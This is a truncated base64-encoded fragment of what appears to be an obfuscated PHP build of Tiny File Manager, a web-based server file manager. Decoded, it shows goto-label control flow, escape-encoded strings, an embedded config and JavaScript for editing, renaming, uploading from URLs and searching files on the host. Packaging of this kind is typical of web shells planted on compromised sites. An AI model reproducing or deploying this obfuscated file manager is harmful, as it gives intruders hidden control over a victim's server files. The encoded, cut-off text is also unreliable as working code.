wxNDUiID0+ICJcMTExXHg2ZVwxNjZcMTQxXDE1NFx4NjlceDY0XHgyMFx4NzVceDcyXDE1NFw0MFwxNjBceDYxXHg3MlwxNDFcMTU1XHg2NVx4NzRcMTQ1XDE2MiIpOyB9IGV2ZW50X2NhbGxiYWNrKGFycmF5KCJcMTQ2XDE0MVwxNTFcMTU0IiA9PiAkZXJyKSk7IH0gfSBkaWU7IH0gZ290byBESkRlQzsgTU9wUTM6ICRDT05GSUcgPSAiXDE3M1x4MjJcMTU0XDE0MVx4NmVceDY3XDQyXHgzYVx4MjJcMTQ1XDE1Nlw0Mlw1NFw0Mlx4NjVceDcyXDE2MlwxNTdceDcyXDEzN1x4NzJcMTQ1XHg3MFwxNTdcMTYyXDE2NFx4NjlcMTU2XDE0N1w0Mlw3Mlx4NjZceDYxXDE1NFx4NzNcMTQ1XDU0XHgyMlx4NzNceDY4XDE1N1x4NzdcMTM3XHg2OFx4NjlcMTQ0XHg2NFwxNDVceDZlXDQyXDcyXHg2Nlx4NjFceDZjXHg3M1wxNDVcNTRcNDJceDY4XDE1MVwxNDRceDY1XHg1Zlx4NDNceDZmXDE1NFx4NzNceDIyXDcyXDE0NlwxNDFceDZjXDE2M1wxNDVcNTRcNDJceDYzXHg2MVx4NmNcMTQzXHg1ZlwxNDZceDZmXDE1NFwxNDRceDY1XHg3Mlx4MjJcNzJcMTQ2XHg2MVwxNTRcMTYzXHg2NVw1NFw0MlwxNjRcMTUwXDE0NVx4NmRcMTQ1XDQyXHgzYVw0MlwxNTRcMTUxXDE0N1wxNTBceDc0XDQyXDE3NSI7IGdvdG8gSTNLZzE7IHN4S3M0OiBzZXRfdGltZV9saW1pdCgwKTsgZ290byBqZ0ZYVTsgQTRhOEE6IGZ1bmN0aW9uIGZtX3Nob3dfZm9vdGVyKCkgeyA/Pgo8L2Rpdj4KPHNjcmlwdCBzcmM9Imh0dHBzOi8vYWpheC5nb29nbGVhcGlzLmNvbS9hamF4L2xpYnMvanF1ZXJ5LzMuNS4xL2pxdWVyeS5taW4uanMiPjwvc2NyaXB0Pgo8c2NyaXB0IHNyYz0iaHR0cHM6Ly9zdGFja3BhdGguYm9vdHN0cmFwY2RuLmNvbS9ib290c3RyYXAvNC41LjIvanMvYm9vdHN0cmFwLm1pbi5qcyI+PC9zY3JpcHQ+CjxzY3JpcHQgc3JjPSJodHRwczovL2Nkbi5kYXRhdGFibGVzLm5ldC8xLjEwLjIzL2pzL2pxdWVyeS5kYXRhVGFibGVzLm1pbi5qcyI+PC9zY3JpcHQ+CjxzY3JpcHQgc3JjPSJodHRwczovL2NkbmpzLmNsb3VkZmxhcmUuY29tL2FqYXgvbGlicy9la2tvLWxpZ2h0Ym94LzUuMy4wL2Vra28tbGlnaHRib3gubWluLmpzIj48L3NjcmlwdD4KPD9waHAgIGlmIChGTV9VU0VfSElHSExJR0hUSlMpIHsgPz4KICAgIDxzY3JpcHQgc3JjPSJodHRwczovL2NkbmpzLmNsb3VkZmxhcmUuY29tL2FqYXgvbGlicy9oaWdobGlnaHQuanMvMTAuNi4wL2hpZ2hsaWdodC5taW4uanMiPjwvc2NyaXB0PgogICAgPHNjcmlwdD5obGpzLmhpZ2hsaWdodEFsbCgpOyB2YXIgaXNIaWdobGlnaHRpbmdFbmFibGVkID0gdHJ1ZTs8L3NjcmlwdD4KPD9waHAgIH0gPz4KPHNjcmlwdD4KICAgICQoZG9jdW1lbnQpLm9uKCdjbGljaycsICdbZGF0YS10b2dnbGU9ImxpZ2h0Ym94Il0nLCBmdW5jdGlvbihldmVudCkgewogICAgICAgIGV2ZW50LnByZXZlbnREZWZhdWx0KCk7CiAgICAgICAgdmFyIHJlSW5pdEhpZ2hsaWdodCA9IGZ1bmN0aW9uKCkgeyBpZih0eXBlb2YgaXNIaWdobGlnaHRpbmdFbmFibGVkICE9PSAidW5kZWZpbmVkIiAmJiBpc0hpZ2hsaWdodGluZ0VuYWJsZWQpIHsgc2V0VGltZW91dChmdW5jdGlvbiAoKSB7ICQoJy5la2tvLWxpZ2h0Ym94LWNvbnRhaW5lciBwcmUgY29kZScpLmVhY2goZnVuY3Rpb24gKGksIGUpIHsgaGxqcy5oaWdobGlnaHRCbG9jayhlKSB9KTsgfSwgNTU1KTsgfSB9OwogICAgICAgICQodGhpcykuZWtrb0xpZ2h0Ym94KHsKICAgICAgICAgICAgYWx3YXlzU2hvd0Nsb3NlOiB0cnVlLCBzaG93QXJyb3dzOiB0cnVlLCBvblNob3duOiBmdW5jdGlvbigpIHsgcmVJbml0SGlnaGxpZ2h0KCk7IH0sIG9uTmF2aWdhdGU6IGZ1bmN0aW9uKGRpcmVjdGlvbiwgaXRlbUluZGV4KSB7IHJlSW5pdEhpZ2hsaWdodCgpOyB9CiAgICAgICAgfSk7CiAgICB9KTsKICAgIC8vVEZNIENvbmZpZwogICAgd2luZG93LmN1cmkgPSAiaHR0cHM6Ly90aW55ZmlsZW1hbmFnZXIuZ2l0aHViLmlvL2NvbmZpZy5qc29uIiwgd2luZG93LmNvbmZpZyA9IG51bGw7CiAgICBmdW5jdGlvbiBmbV9nZXRfY29uZmlnKCl7IGlmKCEhd2luZG93Lm5hbWUpeyB3aW5kb3cuY29uZmlnID0gSlNPTi5wYXJzZSh3aW5kb3cubmFtZSk7IH0gZWxzZSB7ICQuZ2V0SlNPTih3aW5kb3cuY3VyaSkuZG9uZShmdW5jdGlvbihjKSB7IGlmKCEhYykgeyB3aW5kb3cubmFtZSA9IEpTT04uc3RyaW5naWZ5KGMpLCB3aW5kb3cuY29uZmlnID0gYzsgfSB9KTsgfX0KICAgIGZ1bmN0aW9uIHRlbXBsYXRlKGh0bWwsb3B0aW9ucyl7CiAgICAgICAgdmFyIHJlPS88XCUoW15cJT5dKyk/XCU+L2cscmVFeHA9LyheKCApPyhpZnxmb3J8ZWxzZXxzd2l0Y2h8Y2FzZXxicmVha3x7fH0pKSguKik/L2csY29kZT0ndmFyIHI9W107XG4nLGN1cnNvcj0wLG1hdGNoO3ZhciBhZGQ9ZnVuY3Rpb24obGluZSxqcyl7anM/KGNvZGUrPWxpbmUubWF0Y2gocmVFeHApP2xpbmUrJ1xuJzonci5wdXNoKCcrbGluZSsnKTtcbicpOihjb2RlKz1saW5lIT0nJz8nci5wdXNoKCInK2xpbmUucmVwbGFjZSgvIi9nLCdcXCInKSsnIik7XG4nOicnKTtyZXR1cm4gYWRkfQogICAgICAgIHdoaWxlKG1hdGNoPXJlLmV4ZWMoaHRtbCkpe2FkZChodG1sLnNsaWNlKGN1cnNvcixtYXRjaC5pbmRleCkpKG1hdGNoWzFdLCEwKTtjdXJzb3I9bWF0Y2guaW5kZXgrbWF0Y2hbMF0ubGVuZ3RofQogICAgICAgIGFkZChodG1sLnN1YnN0cihjdXJzb3IsaHRtbC5sZW5ndGgtY3Vyc29yKSk7Y29kZSs9J3JldHVybiByLmpvaW4oIiIpOyc7cmV0dXJuIG5ldyBGdW5jdGlvbihjb2RlLnJlcGxhY2UoL1tcclx0XG5dL2csJycpKS5hcHBseShvcHRpb25zKQogICAgfQogICAgZnVuY3Rpb24gbmV3Zm9sZGVyKGUpIHsKICAgICAgICB2YXIgdCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJuZXdmaWxlbmFtZSIpLnZhbHVlLCBuID0gZG9jdW1lbnQucXVlcnlTZWxlY3RvcignaW5wdXRbbmFtZT0ibmV3ZmlsZSJdOmNoZWNrZWQnKS52YWx1ZTsKICAgICAgICBudWxsICE9PSB0ICYmICIiICE9PSB0ICYmIG4gJiYgKHdpbmRvdy5sb2NhdGlvbi5oYXNoID0gIiMiLCB3aW5kb3cubG9jYXRpb24uc2VhcmNoID0gInA9IiArIGVuY29kZVVSSUNvbXBvbmVudChlKSArICImbmV3PSIgKyBlbmNvZGVVUklDb21wb25lbnQodCkgKyAiJnR5cGU9IiArIGVuY29kZVVSSUNvbXBvbmVudChuKSkKICAgIH0KICAgIGZ1bmN0aW9uIHJlbmFtZShlLCB0KSB7dmFyIG4gPSBwcm9tcHQoIk5ldyBuYW1lIiwgdCk7bnVsbCAhPT0gbiAmJiAiIiAhPT0gbiAmJiBuICE9IHQgJiYgKHdpbmRvdy5sb2NhdGlvbi5zZWFyY2ggPSAicD0iICsgZW5jb2RlVVJJQ29tcG9uZW50KGUpICsgIiZyZW49IiArIGVuY29kZVVSSUNvbXBvbmVudCh0KSArICImdG89IiArIGVuY29kZVVSSUNvbXBvbmVudChuKSl9CiAgICBmdW5jdGlvbiBjaGFuZ2VfY2hlY2tib3hlcyhlLCB0KSB7IGZvciAodmFyIG4gPSBlLmxlbmd0aCAtIDE7IG4gPj0gMDsgbi0tKSBlW25dLmNoZWNrZWQgPSAiYm9vbGVhbiIgPT0gdHlwZW9mIHQgPyB0IDogIWVbbl0uY2hlY2tlZCB9CiAgICBmdW5jdGlvbiBnZXRfY2hlY2tib3hlcygpIHsgZm9yICh2YXIgZSA9IGRvY3VtZW50LmdldEVsZW1lbnRzQnlOYW1lKCJmaWxlW10iKSwgdCA9IFtdLCBuID0gZS5sZW5ndGggLSAxOyBuID49IDA7IG4tLSkgKGVbbl0udHlwZSA9ICJjaGVja2JveCIpICYmIHQucHVzaChlW25dKTsgcmV0dXJuIHQgfQogICAgZnVuY3Rpb24gc2VsZWN0X2FsbCgpIHsgY2hhbmdlX2NoZWNrYm94ZXMoZ2V0X2NoZWNrYm94ZXMoKSwgITApIH0KICAgIGZ1bmN0aW9uIHVuc2VsZWN0X2FsbCgpIHsgY2hhbmdlX2NoZWNrYm94ZXMoZ2V0X2NoZWNrYm94ZXMoKSwgITEpIH0KICAgIGZ1bmN0aW9uIGludmVydF9hbGwoKSB7IGNoYW5nZV9jaGVja2JveGVzKGdldF9jaGVja2JveGVzKCkpIH0KICAgIGZ1bmN0aW9uIGNoZWNrYm94X3RvZ2dsZSgpIHsgdmFyIGUgPSBnZXRfY2hlY2tib3hlcygpOyBlLnB1c2godGhpcyksIGNoYW5nZV9jaGVja2JveGVzKGUpIH0KICAgIGZ1bmN0aW9uIGJhY2t1cChlLCB0KSB7IC8vQ3JlYXRlIGZpbGUgYmFja3VwIHdpdGggLmJjawogICAgICAgIHZhciBuID0gbmV3IFhNTEh0dHBSZXF1ZXN0LAogICAgICAgICAgICBhID0gInBhdGg9IiArIGUgKyAiJmZpbGU9IiArIHQgKyAiJnR5cGU9YmFja3VwJmFqYXg9dHJ1ZSI7CiAgICAgICAgcmV0dXJuIG4ub3BlbigiUE9TVCIsICIiLCAhMCksIG4uc2V0UmVxdWVzdEhlYWRlcigiQ29udGVudC10eXBlIiwgImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCIpLCBuLm9ucmVhZHlzdGF0ZWNoYW5nZSA9IGZ1bmN0aW9uICgpIHsKICAgICAgICAgICAgNCA9PSBuLnJlYWR5U3RhdGUgJiYgMjAwID09IG4uc3RhdHVzICYmIHRvYXN0KG4ucmVzcG9uc2VUZXh0KQogICAgICAgIH0sIG4uc2VuZChhKSwgITEKICAgIH0KICAgIC8vIFRvYXN0IG1lc3NhZ2UKICAgIGZ1bmN0aW9uIHRvYXN0KHR4dCkgeyB2YXIgeCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJzbmFja2JhciIpO3guaW5uZXJIVE1MPXR4dDt4LmNsYXNzTmFtZSA9ICJzaG93IjtzZXRUaW1lb3V0KGZ1bmN0aW9uKCl7IHguY2xhc3NOYW1lID0geC5jbGFzc05hbWUucmVwbGFjZSgic2hvdyIsICIiKTsgfSwgMzAwMCk7IH0KICAgIC8vU2F2ZSBmaWxlCiAgICBmdW5jdGlvbiBlZGl0X3NhdmUoZSwgdCkgewogICAgICAgIHZhciBuID0gImFjZSIgPT0gdCA/IGVkaXRvci5nZXRTZXNzaW9uKCkuZ2V0VmFsdWUoKSA6IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJub3JtYWwtZWRpdG9yIikudmFsdWU7CiAgICAgICAgaWYgKG4pIHsKICAgICAgICAgICAgaWYodHJ1ZSl7CiAgICAgICAgICAgICAgICB2YXIgZGF0YSA9IHthamF4OiB0cnVlLCBjb250ZW50OiBuLCB0eXBlOiAnc2F2ZSd9OwoKICAgICAgICAgICAgICAgICQuYWpheCh7CiAgICAgICAgICAgICAgICAgICAgdHlwZTogIlBPU1QiLAogICAgICAgICAgICAgICAgICAgIHVybDogd2luZG93LmxvY2F0aW9uLAogICAgICAgICAgICAgICAgICAgIC8vIFRoZSBrZXkgbmVlZHMgdG8gbWF0Y2ggeW91ciBtZXRob2QncyBpbnB1dCBwYXJhbWV0ZXIgKGNhc2Utc2Vuc2l0aXZlKS4KICAgICAgICAgICAgICAgICAgICBkYXRhOiBKU09OLnN0cmluZ2lmeShkYXRhKSwKICAgICAgICAgICAgICAgICAgICBjb250ZW50VHlwZTogIm11bHRpcGFydC9mb3JtLWRhdGEtZW5jb2RlZDsgY2hhcnNldD11dGYtOCIsCiAgICAgICAgICAgICAgICAgICAgLy9kYXRhVHlwZTogImpzb24iLAogICAgICAgICAgICAgICAgICAgIHN1Y2Nlc3M6IGZ1bmN0aW9uKG1lcyl7dG9hc3QoIlNhdmVkIFN1Y2Nlc3NmdWxseSIpOyB3aW5kb3cub25iZWZvcmV1bmxvYWQgPSBmdW5jdGlvbigpIHtyZXR1cm59fSwKICAgICAgICAgICAgICAgICAgICBmYWlsdXJlOiBmdW5jdGlvbihtZXMpIHt0b2FzdCgiRXJyb3I6IHRyeSBhZ2FpbiIpO30sCiAgICAgICAgICAgICAgICAgICAgZXJyb3I6IGZ1bmN0aW9uKG1lcykge3RvYXN0KGA8cCBzdHlsZT0iYmFja2dyb3VuZC1jb2xvcjpyZWQiPiR7bWVzLnJlc3BvbnNlVGV4dH08L3A+YCk7fQogICAgICAgICAgICAgICAgfSk7CgogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2V7CiAgICAgICAgICAgICAgICB2YXIgYSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImZvcm0iKTsKICAgICAgICAgICAgICAgIGEuc2V0QXR0cmlidXRlKCJtZXRob2QiLCAiUE9TVCIpLCBhLnNldEF0dHJpYnV0ZSgiYWN0aW9uIiwgIiIpOwogICAgICAgICAgICAgICAgdmFyIG8gPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJ0ZXh0YXJlYSIpOwogICAgICAgICAgICAgICAgby5zZXRBdHRyaWJ1dGUoInR5cGUiLCAidGV4dGFyZWEiKSwgby5zZXRBdHRyaWJ1dGUoIm5hbWUiLCAic2F2ZWRhdGEiKTsKICAgICAgICAgICAgICAgIHZhciBjID0gZG9jdW1lbnQuY3JlYXRlVGV4dE5vZGUobik7CiAgICAgICAgICAgICAgICBvLmFwcGVuZENoaWxkKGMpLCBhLmFwcGVuZENoaWxkKG8pLCBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpLCBhLnN1Ym1pdCgpCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CiAgICAvL0NoZWNrIGxhdGVzdCB2ZXJzaW9uCiAgICBmdW5jdGlvbiBsYXRlc3RfcmVsZWFzZV9pbmZvKHYpIHsKICAgICAgICBpZighIXdpbmRvdy5jb25maWcpe3ZhciB0cGxPYmo9e2lkOjEwMjQsdGl0bGU6IkNoZWNrIFZlcnNpb24iLGFjdGlvbjpmYWxzZX0sdHBsPSQoIiNqcy10cGwtbW9kYWwiKS5odG1sKCk7CiAgICAgICAgaWYod2luZG93LmNvbmZpZy52ZXJzaW9uIT12KXt0cGxPYmouY29udGVudD13aW5kb3cuY29uZmlnLm5ld1VwZGF0ZTt9ZWxzZXt0cGxPYmouY29udGVudD13aW5kb3cuY29uZmlnLm5vVXBkYXRlO30KICAgICAgICAkKCcjd3JhcHBlcicpLmFwcGVuZCh0ZW1wbGF0ZSh0cGwsdHBsT2JqKSk7JCgiI2pzLU1vZGFsQ2VudGVyLTEwMjQiKS5tb2RhbCgnc2hvdycpO31lbHNle2ZtX2dldF9jb25maWcoKTt9CiAgICB9CiAgICBmdW5jdGlvbiBzaG93X25ld19wd2QoKSB7ICQoIi5qcy1uZXctcHdkIikudG9nZ2xlQ2xhc3MoJ2hpZGRlbicpOyB9CiAgICAvL1NhdmUgU2V0dGluZ3MKICAgIGZ1bmN0aW9uIHNhdmVfc2V0dGluZ3MoJHRoaXMpIHsKICAgICAgICBsZXQgZm9ybSA9ICQoJHRoaXMpOwogICAgICAgICQuYWpheCh7CiAgICAgICAgICAgIHR5cGU6IGZvcm0uYXR0cignbWV0aG9kJyksIHVybDogZm9ybS5hdHRyKCdhY3Rpb24nKSwgZGF0YTogZm9ybS5zZXJpYWxpemUoKSsiJmFqYXg9Iit0cnVlLAogICAgICAgICAgICBzdWNjZXNzOiBmdW5jdGlvbiAoZGF0YSkge2lmKGRhdGEpIHsgd2luZG93LmxvY2F0aW9uLnJlbG9hZCgpO319CiAgICAgICAgfSk7IHJldHVybiBmYWxzZTsKICAgIH0KICAgIC8vQ3JlYXRlIG5ldyBwYXNzd29yZCBoYXNoCiAgICBmdW5jdGlvbiBuZXdfcGFzc3dvcmRfaGFzaCgkdGhpcykgewogICAgICAgIGxldCBmb3JtID0gJCgkdGhpcyksICRwd2QgPSAkKCIjanMtcHdkLXJlc3VsdCIpOyAkcHdkLnZhbCgnJyk7CiAgICAgICAgJC5hamF4KHsKICAgICAgICAgICAgdHlwZTogZm9ybS5hdHRyKCdtZXRob2QnKSwgdXJsOiBmb3JtLmF0dHIoJ2FjdGlvbicpLCBkYXRhOiBmb3JtLnNlcmlhbGl6ZSgpKyImYWpheD0iK3RydWUsCiAgICAgICAgICAgIHN1Y2Nlc3M6IGZ1bmN0aW9uIChkYXRhKSB7IGlmKGRhdGEpIHsgJHB3ZC52YWwoZGF0YSk7IH0gfQogICAgICAgIH0pOyByZXR1cm4gZmFsc2U7CiAgICB9CiAgICAvL1VwbG9hZCBmaWxlcyB1c2luZyBVUkwgQHBhcmFtIHtPYmplY3R9CiAgICBmdW5jdGlvbiB1cGxvYWRfZnJvbV91cmwoJHRoaXMpIHsKICAgICAgICBsZXQgZm9ybSA9ICQoJHRoaXMpLCByZXN1bHRXcmFwcGVyID0gJCgiZGl2I2pzLXVybC11cGxvYWRfX2xpc3QiKTsKICAgICAgICAkLmFqYXgoewogICAgICAgICAgICB0eXBlOiBmb3JtLmF0dHIoJ21ldGhvZCcpLCB1cmw6IGZvcm0uYXR0cignYWN0aW9uJyksIGRhdGE6IGZvcm0uc2VyaWFsaXplKCkrIiZhamF4PSIrdHJ1ZSwKICAgICAgICAgICAgYmVmb3JlU2VuZDogZnVuY3Rpb24oKSB7IGZvcm0uZmluZCgiaW5wdXRbbmFtZT11cGxvYWR1cmxdIikuYXR0cigiZGlzYWJsZWQiLCJkaXNhYmxlZCIpOyBmb3JtLmZpbmQoImJ1dHRvbiIpLmhpZGUoKTsgZm9ybS5maW5kKCIubGRzLWZhY2Vib29rIikuYWRkQ2xhc3MoJ3Nob3ctbWUnKTsgfSwKICAgICAgICAgICAgc3VjY2VzczogZnVuY3Rpb24gKGRhdGEpIHsKICAgICAgICAgICAgICAgIGlmKGRhdGEpIHsKICAgICAgICAgICAgICAgICAgICBkYXRhID0gSlNPTi5wYXJzZShkYXRhKTsKICAgICAgICAgICAgICAgICAgICBpZihkYXRhLmRvbmUpIHsKICAgICAgICAgICAgICAgICAgICAgICAgcmVzdWx0V3JhcHBlci5hcHBlbmQoJzxkaXYgY2xhc3M9ImFsZXJ0IGFsZXJ0LXN1Y2Nlc3Mgcm93Ij5VcGxvYWRlZCBTdWNjZXNzZnVsOiAnK2RhdGEuZG9uZS5uYW1lKyc8L2Rpdj4nKTsgZm9ybS5maW5kKCJpbnB1dFtuYW1lPXVwbG9hZHVybF0iKS52YWwoJycpOwogICAgICAgICAgICAgICAgICAgIH0gZWxzZSBpZihkYXRhWydmYWlsJ10pIHsgcmVzdWx0V3JhcHBlci5hcHBlbmQoJzxkaXYgY2xhc3M9ImFsZXJ0IGFsZXJ0LWRhbmdlciByb3ciPkVycm9yOiAnK2RhdGEuZmFpbC5tZXNzYWdlKyc8L2Rpdj4nKTsgfQogICAgICAgICAgICAgICAgICAgIGZvcm0uZmluZCgiaW5wdXRbbmFtZT11cGxvYWR1cmxdIikucmVtb3ZlQXR0cigiZGlzYWJsZWQiKTtmb3JtLmZpbmQoImJ1dHRvbiIpLnNob3coKTtmb3JtLmZpbmQoIi5sZHMtZmFjZWJvb2siKS5yZW1vdmVDbGFzcygnc2hvdy1tZScpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9LAogICAgICAgICAgICBlcnJvcjogZnVuY3Rpb24oeGhyKSB7CiAgICAgICAgICAgICAgICBmb3JtLmZpbmQoImlucHV0W25hbWU9dXBsb2FkdXJsXSIpLnJlbW92ZUF0dHIoImRpc2FibGVkIik7Zm9ybS5maW5kKCJidXR0b24iKS5zaG93KCk7Zm9ybS5maW5kKCIubGRzLWZhY2Vib29rIikucmVtb3ZlQ2xhc3MoJ3Nob3ctbWUnKTtjb25zb2xlLmVycm9yKHhocik7CiAgICAgICAgICAgIH0KICAgICAgICB9KTsgcmV0dXJuIGZhbHNlOwogICAgfQogICAgLy9TZWFyY2ggdGVtcGxhdGUKICAgIGZ1bmN0aW9uIHNlYXJjaF90ZW1wbGF0ZShkYXRhKSB7CiAgICAgICAgdmFyIHJlc3BvbnNlID0gIiI7CiAgICAgICAgJC5lYWNoKGRhdGEsIGZ1bmN0aW9uIChrZXksIHZhbCkgewogICAgICAgICAgICByZXNwb25zZSArPSBgPGxpPjxhIGhyZWY9Ij9wPSR7dmFsLnBhdGh9JnZpZXc9JHt2YWwubmFtZX0iPiR7dmFsLnBhdGh9LyR7dmFsLm5hbWV9PC9hPjwvbGk+YDsKICAgICAgICB9KTsKICAgICAgICByZXR1cm4gcmVzcG9uc2U7CiAgICB9CiAgICAvL3NlYXJjaAogICAgZnVuY3Rpb24gZm1fc2VhcmNoKCkgewogICAgICAgIHZhciBzZWFyY2hUeHQgPSAkKCJpbnB1dCNhZHZhbmNlZC1zZWFyY2giKS52YWwoKSwgc2VhcmNoV3JhcHBlciA9ICQoInVsI3NlYXJjaC13cmFwcGVyIiksIHBhdGggPSAkKCIjanMtc2VhcmNoLW1vZGFsIikuYXR0cigiaHJlZiIpLCBfaHRtbCA9ICIiLCAkbG9hZGVyID0gJCgiZGl2Lmxkcy1mYWNlYm9vayIpOwogICAgICAgIGlmKCEhc2VhcmNoVHh0ICYmIHNlYXJjaFR4dC5sZW5ndGggPiAyICYmIHBhdGgpIHsKICAgICAgICAgICAgdmFyIGRhdGEgPSB7YWpheDogdHJ1ZSwgY29udGVudDogc2VhcmNoVHh0LCBwYXRoOnBhdGgsIHR5cGU6ICdzZWFyY2gnfTsKICAgICAgICAgICAgJC5hamF4KHsKICAgICAgICAgICAgICAgIHR5cGU6ICJQT1NUIiwKICAgICAgICAgICAgICAgIHVybDogd2luZG93LmxvY2F0aW9uLAogICAgICAgICAgICAgICAgZGF0YTogZGF0YSwKICAgICAgICAgICAgICAgIGJlZm9yZVNlbmQ6IGZ1bmN0aW9uKCkgewogICAgICAgICAgICAgICAgICAgIHNlYXJjaFdyYXBwZXIuaHRtbCgnJyk7CiAgICAgICAgICAgICAgICAgICAgJGxvYWRlci5hZGRDbGFzcygnc2hvdy1tZScpOwogICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgIHN1Y2Nlc3M6IGZ1bmN0aW9uKGRhdGEpewogICAgICAgICAgICAgICAgICAgICRsb2FkZXIucmVtb3ZlQ2xhc3MoJ3Nob3ctbWUnKTsKICAgICAgICAgICAgICAgICAgICBkYXRhID0gSlNPTi5wYXJzZShkYXRhKTsKICAgICAgICAgICAgICAgICAgICBpZihkYXRhICYmIGRhdGEubGVuZ3RoKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIF9odG1sID0gc2VhcmNoX3RlbXBsYXRlKGRhdGEpOwogICAgICAgICAgICAgICAgICAgICAgICBzZWFyY2hXcmFwcGVyLmh0bWwoX2h0bWwpOwogICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7IHNlYXJjaFdyYXBwZXIuaHRtbCgnPHAgY2xhc3M9Im0tMiI+Tm8gcmVzdWx0IGZvdW5kITxwPicpOyB9CiAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgZXJyb3I6IGZ1bmN0aW9uKHhocikgeyAkbG9hZGVyLnJlbW92ZUNsYXNzKCdzaG93LW1lJyk7IHNlYXJjaFdyYXBwZXIuaHRtbCgnPHAgY2xhc3M9Im0tMiI+RVJST1I6IFRyeSBhZ2FpbiBsYXRlciE8L3A+Jyk7IH0sCiAgICAgICAgICAgICAgICBmYWlsdXJlOiBmdW5jdGlvbihtZXMpIHsgJGxvYWRlci5yZW1vdmVDbGFzcygnc2hvdy1tZScpOyBzZWFyY2hXcmFwcGVyLmh0bWwoJzxwIGNsYXNzPSJtLTIiPkVSUk9SOiBUcnkgYWdhaW4gbGF0ZXIhPC9wPicpO30KICAgICAgICAgICAgfSk7CiAgICAgICAgfSBlbHNlIHsgc2VhcmNoV3JhcHBlci5odG1sKCJPT1BTOiBtaW5pbXVtIDMgY2hhcmFjdGVycyByZXF1aXJlZCEiKTsgfQogICAgfQoKICAgIC8vb24gbW91c2UgaG92ZXIgaW1hZ2UgcHJldmlldwogICAgIWZ1bmN0aW9uKHMpe3MucHJldmlld0ltYWdlPWZ1bmN0aW9uKGUpe3ZhciBvPXMoZG9jdW1lbnQpLHQ9Ii5wcmV2aWV3SW1hZ2UiLGE9cy5leHRlbmQoe3hPZmZzZXQ6MjAseU9mZnNldDotMjAsZmFkZUluOiJmYXN0Iixjc3M6e3BhZGRpbmc6IjVweCIsYm9yZGVyOiIxcHggc29saWQgI2NjY2NjYyIsImJhY2tncm91bmQtY29sb3IiOiIjZmZmIn0sZXZlbnRTZWxlY3RvcjoiW2RhdGEtcHJldmlldy1pbWFnZV0iLGRhdGFLZXk6InByZXZpZXdJbWFnZSIsb3ZlcmxheUlkOiJwcmV2aWV3LWltYWdlLXBsdWdpbi1vdmVybGF5In0sZSk7cmV0dXJuIG8ub2ZmKHQpLG8ub24oIm1vdXNlb3ZlciIrdCxhLmV2ZW50U2VsZWN0b3IsZnVuY3Rpb24oZSl7cygicCMiK2Eub3ZlcmxheUlkKS5yZW1vdmUoKTt2YXIgbz1zKCI8cD4iKS5hdHRyKCJpZCIsYS5vdmVybGF5SWQpLmNzcygicG9zaXRpb24iLCJhYnNvbHV0ZSIpLmNzcygiZGlzcGxheSIsIm5vbmUiKS5hcHBlbmQocygnPGltZyBjbGFzcz0iYy1wcmV2aWV3LWltZyI+JykuYXR0cigic3JjIixzKHRoaXMpLmRhdGEoYS5kYXRhS2V5KSkpO2EuY3NzJiZvLmNzcyhhLmNzcykscygiYm9keSIpLmFwcGVuZChvKSxvLmNzcygidG9wIixlLnBhZ2VZK2EueU9mZnNldCsicHgiKS5jc3MoImxlZnQiLGUucGFnZVgrYS54T2Zmc2V0KyJweCIpLmZhZGVJbihhLmZhZGVJbil9KSxvLm9uKCJtb3VzZW91dCIrdCxhLmV2ZW50U2VsZWN0b3IsZnVuY3Rpb24oKXtzKCIjIithLm92ZXJsYXlJZCkucmVtb3ZlKCl9KSxvLm9uKCJtb3VzZW1vdmUiK3QsYS5ldmVudFNlbGVjdG9yLGZ1bmN0aW9uKGUpe3MoIiMiK2Eub3ZlcmxheUlkKS5jc3MoInRvcCIsZS5wYWdlWSthLnlPZmZzZXQrInB4IikuY3NzKCJsZWZ0IixlLnBhZ2VYK2EueE9mZnNldCsicHgiKX0pLHRoaXN9LHMucHJldmlld0ltYWdlKCl9KGpRdWVyeSk7CgogICAgLy8gRG9tIFJlYWR5IEV2ZW50CiAgICAkKGRvY3VtZW50KS5yZWFkeSggZnVuY3Rpb24gKCkgewogICAgICAgIC8vbG9hZCBjb25maWcKICAgICAgICBmbV9nZXRfY29uZmlnKCk7CiAgICAgICAgLy9kYXRhVGFibGUgaW5pdAogICAgICAgIHZhciAkdGFibGUgPSAkKCcjbWFpbi10YWJsZScpLAogICAgICAgICAgICB0YWJsZUxuZyA9ICR0YWJsZS5maW5kKCd0aCcpLmxlbmd0aCwKICAgICAgICAgICAgX3RhcmdldHMgPSAodGFibGVMbmcgJiYgdGFibGVMbmcgPT0gNyApID8gWzAsIDQsNSw2XSA6IHRhYmxlTG5nID09IDUgPyBbMCw0XSA6IFszXSwKICAgICAgICAgICAgbWFpblRhYmxlID0gJCgnI21haW4tdGFibGUnKS5EYXRhVGFibGUoeyJwYWdpbmciOiBmYWxzZSwgImluZm8iOiBmYWxzZSwgIm9yZGVyIjogW10sICJjb2x1bW5EZWZzIjogW3sidGFyZ2V0cyI6IF90YXJnZXRzLCAib3JkZXJhYmxlIjogZmFsc2V9XQogICAgICAgIH0pOwogICAgICAgIC8vc2VhcmNoCiAgICAgICAgJCgnI3NlYXJjaC1hZGRvbicpLm9uKCAna2V5dXAnLCBmdW5jdGlvbiAoKSB7CiAgICAgICAgICAgIG1haW5UYWJsZS5zZWFyY2goIHRoaXMudmFsdWUgKS5kcmF3KCk7CiAgICAgICAgfSk7CiAgICAgICAgJCgiaW5wdXQjYWR2YW5jZWQtc2VhcmNoIikub24oJ2tleXVwJywgZnVuY3Rpb24gKGUpIHsKICAgICAgICAgICAgaWYgKGUua2V5Q29kZSA9PT0gMTMpIHsgZm1fc2VhcmNoKCk7IH0KICAgICAgICB9KTsKICAgICAgICAkKCcjc2VhcmNoLWFkZG9uMycpLm9uKCAnY2xpY2snLCBmdW5jdGlvbiAoKSB7IGZtX